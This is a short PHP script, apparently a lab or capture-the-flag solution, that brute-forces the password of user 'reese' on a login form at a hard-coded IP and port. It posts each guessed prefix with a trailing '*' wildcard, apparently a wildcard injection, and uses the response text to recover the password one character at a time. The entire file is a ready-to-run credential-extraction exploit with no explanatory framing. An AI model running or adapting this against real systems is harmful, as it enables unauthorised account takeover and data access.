<?php
function sendPostToLogin($username, $password) {

    $url = '165.232.46.248:31100/login';

    $data = array(
        'username' => $username,
        'password' => $password
    );

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookie.txt');

    $curlResponse = curl_exec($curl);
    curl_close($curl);
    unlink('cookie.txt');

    return $curlResponse;
}

$characterArray = array_merge(range(0,9), range('a','z'), range('A','Z'), array('!','@','#','$','%','^','&','(',')','_','+','{','}','[',']','|','\\',';',':','"',"'",'<','>','?',',','.','/','~','`'));
$discoveredPassword = "";
$usernameFound = false;


while (!$usernameFound) {
    for ($i = 0; $i < count($characterArray); $i++) {
        $curlResponse = sendPostToLogin('reese', $discoveredPassword.$characterArray[$i].'*');
        if ($curlResponse === false) {
            echo 'Error: '.curl_error($curl);
        } else {
            if (strpos($curlResponse, 'No search results') !== false) {
                $discoveredPassword .= $characterArray[$i];
                echo $discoveredPassword."\n";
                break;
            } else {
                echo ".";
            }
        }
        if ($i == count($characterArray) - 1) {
            $usernameFound = true;
            echo "\nEnumerated password: $discoveredPassword\n";
        }
    }
}
